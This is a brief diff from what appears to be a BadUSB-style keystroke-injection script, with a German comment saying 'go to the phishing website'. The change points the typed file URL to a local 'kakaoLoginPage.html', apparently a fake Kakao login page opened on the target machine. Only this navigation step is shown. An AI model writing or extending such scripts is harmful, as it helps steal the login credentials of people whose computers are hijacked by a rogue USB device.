@@ -24,6 +24,6 @@ kbd.release_all()
 time.sleep(2)
 
 # Gehe zur Phishing-Website
-layout.write('file:///D:\index731c.html')
+layout.write('file:///D:\kakaoLoginPage.html')
 kbd.press(Keycode.ENTER)
 kbd.release_all()
